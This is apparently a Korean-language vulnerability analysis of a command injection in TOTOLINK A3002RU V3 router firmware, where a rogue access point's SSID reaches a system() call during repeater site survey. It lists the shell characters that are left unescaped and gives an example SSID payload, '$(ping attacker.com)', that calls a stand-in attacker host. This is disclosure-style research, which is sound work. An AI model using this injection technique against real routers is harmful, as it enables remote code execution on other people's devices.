# 📡 TOTOLINK Repeater SSID Command Injection 분석

> TOTOLINK A3002RU V3 Firmware 기반 Repeater / Site Survey 취약점 분석

---

## 📌 1. Background

• 공유기 웹 관리 인터페이스 존재  
• Repeater (Site Survey) 기능 제공  
• 외부 환경 입력(SSID) 처리 구조 존재  
• 내부 명령 실행 구조 포함 → 보안 검증 필요  

---

## 🎯 2. Target

**Product**  
`TOTOLINK A3002RU V3`

**Binary**  
`/bin/boa`

**Interface**  
`Web Interface (/boafrm/)`

**Role**  
`Wireless configuration / repeater control`

---

## 🔗 3. Data Flow Structure


[ External Input (SSID) ]
↓
[ Site Survey Scan Cache ]
↓
[ MIB (apmib_set) ]
↓
[ Profile Rebuild (apmib_get) ]
↓
[ Command Construction (sprintf) ]
↓
[ system() Execution ]


---

## ⚙️ 4. Command Handling


iwpriv <interface> set_mib ap_profile_add="%s",...


• SSID 값이 `%s`로 삽입됨  
• sprintf로 문자열 구성  
• system()으로 실행됨  

---

## 🔍 5. Verification Result

### ✔️ 입력 처리 특성

• SSID = 외부 AP에서 수신된 값  
• 사용자 선택 후 내부로 전달됨  
• Scan cache → MIB → Profile 경로 확인됨  

---

### ✔️ 데이터 흐름

• `formWlSiteSurvey` → SSID 선택  
• `apmib_set()` → 내부 저장  
• `apmib_get()` → 프로파일 재구성  
• `sprintf()` → 명령 문자열 생성  
• `system()` → 실제 실행  

👉 입력 → 실행까지 완전한 데이터 흐름 존재  

---

### ⚠️ Sanitization 문제

**Escape 처리됨**
- `\`
- `%`
- `"`
- `'`
- `` ` ``

**Escape 처리 안됨**
- `$`
- `(`
- `)`
- `;`
- `#`
- `&`
- `|`
- newline  

---

### ⚠️ 취약 동작


SSID = $(ping attacker.com)


👉 system() 호출 시:


iwpriv ... ap_profile_add="$(ping attacker.com)",...


👉 shell command substitution 실행됨  

---

## 🔐 6. Access Control

### 🔓 Web Interface

• 관리자 인증 필요  
• 로그인 후 접근 가능  

---

### 🌐 Input Source

• SSID = 외부 환경 입력  
• 공격자가 직접 제어 가능  

---

### ⚠️ 특징

• 내부 입력이 아닌 외부 무선 환경 입력  
• 사용자 인지 없이 전달 가능  

---

## 🔄 7. System Relationship


[ Rogue AP (SSID) ]
↓
[ Admin Web UI (Site Survey) ]
↓
[ boa (Handler) ]
↓
[ MIB ]
↓
[ system() ]


• 외부 AP → 내부 설정 → 명령 실행  
• indirect injection 구조  

---

## ⚠️ 8. Impact

• 공유기 명령 실행 (RCE)  
• 시스템 설정 변조 가능  
• 서비스 중단 가능  
• 추가 악성 코드 실행 가능  

---

## 🧩 9. Conclusion

외부에서 제어 가능한 SSID가 내부 설정을 거쳐  
shell 명령으로 실행되는 구조적 취약점 존재  

---

## 💬 One-line Summary

외부 AP의 SSID를 통해  
공유기 내부 명령 실행이 가능한 Repeater 기반 Command Injection 취약점